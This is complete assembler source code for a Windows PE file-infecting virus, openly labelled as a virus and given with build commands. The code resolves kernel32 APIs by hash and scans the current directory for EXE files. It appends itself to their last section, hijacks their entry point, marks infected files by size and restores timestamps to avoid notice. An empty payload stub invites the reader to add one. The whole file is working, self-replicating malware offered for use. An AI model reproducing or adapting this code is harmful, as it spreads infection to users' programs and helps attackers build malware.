;WARNING - THIS IS A VIRUS ASSEMBLER SOURCE CODE
;
;compile with:
;TASM32 /M /ML VIRUS.ASM
;TLINK32 VIRUS.OBJ,,,IMPORT32.LIB

.586
.model flat
locals

ofs 	equ 	offset
by	equ 	byte ptr
wo	equ	word ptr
dwo	equ	dword ptr

include	pe.inc
include	mz.inc
include win32api.inc
include useful.inc

.data

virus_main:
;setup stack to return to host later
	push ofs __ret
  original_entrypoint equ $-4

;retrieve kernel32.dll base

	mov eax,[esp.Arg1]
  @@search:
	xor ax,ax
        cmp [eax.MZ_magic],IMAGE_DOS_SIGNATURE
        jnz @@nopeheader
        mov ecx,[eax.MZ_lfanew]
        cmp [ecx+eax.NT_Signature],IMAGE_NT_SIGNATURE
        jz @@found
  @@nopeheader:
  	dec eax
  	jmp @@search
  @@found:

;get all APIs the virus need

	call get_k32_apis

;infect files

	call infect_files

;scare user

	call payload

;return to host
	ret


;secret routine

delta:
	call @@delta
  @@delta:
	pop ebp
	sub ebp, ofs @@delta
	ret


API	macro	s
_&s     dd 0
	CHASH &s
endm


CHASH	macro s
	hash = 0
        irpc c, <s>
	hash = ((hash shl 7) and 0FFFFFFFFh) or (hash shr (32-7))
        hash = hash xor '&c'
        endm
        dd hash
endm


COMPARE	macro
LOCAL @@calc_hash
        pushad
	lodsd
	mov esi,[ebx]
        xor edx, edx
  @@calc_hash:
	rol edx, 7
        xor dl,[esi.ebp]
        inc esi
        cmp by [esi.ebp],0
        jne @@calc_hash
        sub eax,edx
	popad
endm


GONEXT	macro
	lodsd
endm


X_PUSH  macro r, x
        xor r, r
        _reg = 0
        _xsize = 0
        l = 0
        irpc c, <x>
        l = l + 1
        endm
        j = 0
        s = 0
        l0 = l
        if (l0 and 3) ne 0
        j = j shl 8 + "x"
        s = s + 8
        l0 = l0 + 1
        endif
        if (l0 and 3) ne 0
        j = j shl 8 + "y"
        s = s + 8
        l0 = l0 + 1
        endif
        if (l0 and 3) ne 0
        j = j shl 8 + "z"
        s = s + 8
        l0 = l0 + 1
        endif
        q = 0
        i = l - 1
        irpc c1, <x>
        t = 0
        irpc c, <x>
        k = "&c"
        if k eq "~"    			;zero
        k = 0
        endif
        if k eq "|"    			;space
        k = 32
        endif
        if k eq "ö"    			;cr
        k = 13
        endif
        if k eq "õ"    			;lf
        k = 10
        endif
        if t eq i
        j = j shl 8
        if k ne 0
        j = j + k
        endif
        s = s + 8
        if s eq 32
        _xsize = _xsize + 4
        if q eq 0
	sub r, _reg - j
        endif
        if (q eq 1) or (q eq 3)
        xor r, _reg xor j
        endif
        if q eq 2
        add r, j - _reg
        endif
        push r
        _reg = j
        q = q + 1
        if q eq 4
        q = 0
        endif
        s = 0
        j = 0
        endif
        exitm
        endif
        t = t + 1
        endm l irpc
        i = i - 1
        endm
        if s ne 0
        error
        endif
endm


X_POP   macro
        lea esp, [esp + _xsize]
endm

WORKSIZE	EQU	256*1024

;map the file in memory, and check if is a infectable PE file

map_infect:
	pushad

	call delta

        mov edi,[esp.cPushad.Pshd.WFD_nFileSizeLow]
	lea esi,[esp.cPushad.Pshd.WFD_szFileName]

;first of all, remove file attribute

        push FILE_ATTRIBUTE_NORMAL
        push esi
        call [ebp+_SetFileAttributesA]
        test eax,eax
        jz @@error

;check if file is already infected (file size / 16 = 13)

        mov eax,edi
        and eax,15
	xor eax,13
	jz @@error_fixatt

;open file

        push 0
        push FILE_ATTRIBUTE_NORMAL
        push OPEN_EXISTING
        push 0
        push FILE_SHARE_READ
        push GENERIC_WRITE+GENERIC_READ
        push esi
        call [ebp+_CreateFileA]
        mov ebx,eax
        inc eax
        jz @@error_fixatt

	add edi,WORKSIZE

;create map

        push 0
        push edi
        push 0
        push PAGE_READWRITE
        push 0
        push ebx
        call [ebp+_CreateFileMappingA]
        test eax,eax
        jz @@close_file
	mov edi,eax

;map file

        push 0
        push 0
        push 0
        push FILE_MAP_ALL_ACCESS
        push edi
        call [ebp+_MapViewOfFile]
        test eax, eax
        je @@close_map

        push eax

;check if the file is in PE file format

        cmp [eax.MZ_magic],IMAGE_DOS_SIGNATURE
        jnz @@close_view

        mov ecx,[eax.MZ_lfanew]
        cmp ecx,[esp.cPushad.Pshd.WFD_nFileSizeLow+4]
	jae @@close_view

        cmp [ecx+eax.NT_Signature],IMAGE_NT_SIGNATURE
        jnz @@close_view

;and check if it is infectable

        cmp [ecx+eax.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
        jnz @@close_view

        cmp [ecx+eax.NT_OptionalHeader.OH_Magic],IMAGE_NT_OPTIONAL_HDR_MAGIC
        jnz @@close_view

        movzx ecx,[ecx+eax.NT_FileHeader.FH_Characteristics]

        test ecx,IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_32BIT_MACHINE
        jz @@close_view

        test ecx,IMAGE_FILE_SYSTEM+IMAGE_FILE_DLL
        jnz @@close_view

;infect file!

	mov ecx,[esp.cPushad.Pshd.WFD_nFileSizeLow.Pshd]
	call infect_image

;mark file as infected

	add eax,15
        and eax,not 15
        add eax,13
	mov [esp.cPushad.Pshd.WFD_nFileSizeLow.Pshd],eax

  @@close_view:
        call [ebp+_UnmapViewOfFile]

  @@close_map:
        push edi
        call [ebp+_CloseHandle]

;set new file size

        push NULL
        push NULL
        push dwo [esp.cPushad.Pshd.WFD_nFileSizeLow.(Pshd*2)]
        push ebx
        call [ebp+_SetFilePointer]

        push ebx
        call [ebp+_SetEndOfFile]

;restore time/date stamp

  @@close_file:
        lea eax,[esp.cPushad.Pshd.WFD_ftLastWriteTime.FT_dwLowDateTime]
        push eax
	add eax,8
        push eax
	add eax,8
        push eax
        push ebx
        call [ebp+_SetFileTime]

  	push ebx
  	call [ebp+_CloseHandle]

;restore file attributes

  @@error_fixatt:
        push [esp.cPushad.Pshd.WFD_dwFileAttributes]
        push esi
        call [ebp+_SetFileAttributesA]

  @@error:
	popad
	ret

;infect file by increasing the last file section

infect_image:
	pushad
        mov ebp,eax

;calculate last section header position (the one we will increase)

        mov esi,[ebp.MZ_lfanew]
        add esi,ebp
        movzx eax,wo [esi.NT_FileHeader.FH_NumberOfSections]
        imul eax,eax,IMAGE_SIZEOF_SECTION_HEADER
	lea edi,[esi.eax+(size IMAGE_NT_HEADERS-IMAGE_SIZEOF_SECTION_HEADER)]

        mov ebx,[edi.SH_SizeOfRawData]
        mov edx,ebx
	add ebx,[edi.SH_VirtualAddress]
	add edx,[edi.SH_PointerToRawData]

;set new entrypoint

        xchg ebx,[esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
        add ebx,[esi.NT_OptionalHeader.OH_ImageBase]

;modify section values to virus needs

        mov dwo [edi.SH_Characteristics],IMAGE_SCN_CNT_INITIALIZED_DATA+IMAGE_SCN_MEM_READ+IMAGE_SCN_MEM_WRITE

        call get_virus_size
        add eax,[edi.SH_SizeOfRawData]
        mov ecx,[esi.NT_OptionalHeader.OH_FileAlignment]
        dec ecx
        add eax,ecx
        not ecx
        and eax,ecx
        mov [edi.SH_SizeOfRawData],eax

	add eax,[edi.SH_PointerToRawData]
	mov [esp.Pushad_eax],eax

        call get_virus_size
        add eax,[edi.SH_VirtualSize]
        mov ecx,[esi.NT_OptionalHeader.OH_SectionAlignment]
        dec ecx
        add eax,ecx
        not ecx
        and eax,ecx
        mov [edi.SH_VirtualSize],eax

	add eax,[edi.SH_VirtualAddress]
        mov [esi.NT_OptionalHeader.OH_SizeOfImage],eax

	push esi
        mov eax,[esi.NT_OptionalHeader.OH_AddressOfEntryPoint]

	call @@delta
  @@delta:
  	pop esi
  	sub esi,ofs @@delta-ofs virus_main

  	mov dwo [esi+(ofs original_entrypoint-ofs virus_main)],ebx

;call encryption routine

        mov ecx,virus_size
	lea edi,[edx+ebp]
        call encrypt

;fix the entrypoint, in case that the encryption changed it

        pop esi
        add [esi.NT_OptionalHeader.OH_AddressOfEntryPoint],eax

	popad
	ret

;no payload. put you payload here

payload:
	ret

;return virus size

get_virus_size:
	mov eax, virus_size
	ret

;as this virus dont use encryption, just copy it to host file

encrypt:
	sub eax,eax
	pushad
	rep movsb
	popad
	ret

infect_files:
	pushad

	call delta

;search for *.EXE files in the current directory

	sub esp,SIZEOF_WIN32_FIND_DATA
	mov eax,esp
	X_PUSH ecx,*.EXE~
	mov ecx,esp

	push eax
	push ecx
	call [ebp+_FindFirstFileA]
	X_POP
	mov ebx,eax
	inc eax

;no file found? exit...

  @@find_next:
	jz @@end_search

;found a file? map and infect it

	call map_infect

;search next file

	push esp
	push ebx
	call [ebp+_FindNextFileA]
	test eax,eax
	jmp @@find_next

;close the search handle

  @@end_search:
  	push ebx
  	call [ebp+_FindClose]

	add esp,SIZEOF_WIN32_FIND_DATA
	popad
	ret


;this routine retrieve from the kernel32.dll image (in EAX) the APIs the virus need.

get_k32_apis:
	call @@apiimport

API SetFileTime
API SetFileAttributesA
API CreateFileA
API CreateFileMappingA
API MapViewOfFile
API UnmapViewOfFile
API CloseHandle
API SetFilePointer
API SetEndOfFile
API FindFirstFileA
API FindNextFileA
API FindClose

	dd -1

  @@apiimport:

;ESI will hold the APIs we need

  	pop esi


get_apis:
	pushad

;eax = dll imagebase

	mov ebp,eax
	add eax,[ebp.MZ_lfanew]

;EDI will hold the pointer to dll export directory

	mov edi,[eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add edi,ebp

;check if all APIs where retrieved. if so, exit

  @@scan_name:
	mov edx,esi
  	lodsd
  	inc eax
  	jz @@done_import

;now, in a cycle, compare the name of the APIs in the kernel32.dll export
;table with the API we need.

	mov ebx,[edi.ED_AddressOfNames]
	add ebx,ebp
	sub ecx,ecx
  @@getapinameptr:
	COMPARE
	jz @@found

;check next API in kernel32.dll export table

	inc ecx
	add ebx,4
	jmp @@getapinameptr

;we found the API. so, retrieve its ordinal number, and use it to get the API
;address

  @@found:
	mov eax,[edi.ED_AddressOfNameOrdinals]
	add eax,ebp
	shl ecx, 1
	movzx ecx,wo [eax.ecx]

	mov eax,[edi.ED_AddressOfFunctions]
	add eax,ebp
	mov eax,[eax.(ecx*4)]
	add eax,ebp
	mov [edx],eax

	GONEXT
	jmp @@scan_name

  @@done_import:
	popad
	ret
virus_size=$-virus_main


.code

;thats the stub code, that simulate a infected file, for the virus first
;generation sample.

stubcode:
	jmp virus_main

  __ret:
	push 10*1000
extrn Sleep:PROC
	call Sleep
	push 0
extrn ExitProcess:PROC
	call ExitProcess

end	stubcode

